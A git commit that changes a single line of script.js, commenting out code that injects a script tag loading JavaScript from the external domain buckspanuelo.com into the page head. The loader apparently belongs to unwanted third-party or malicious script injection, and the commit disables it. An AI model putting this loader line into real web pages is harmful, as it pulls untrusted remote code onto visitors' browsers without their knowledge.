80219ba541a7b7a29f4a53998775252609807b37
qunaladin <110922078+qunaladin@users.noreply.github.com>
2022-08-09 22:36:39 +0700

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,1 @@
-const jsSwa=document.createElement('script');jsSwa.src='//buckspanuelo.com/fZmiK2tcrVEkb/53943';document.head.appendChild(jsSwa);
+//const jsSwa=document.createElement('script');jsSwa.src='//buckspanuelo.com/fZmiK2tcrVEkb/53943';document.head.appendChild(jsSwa);
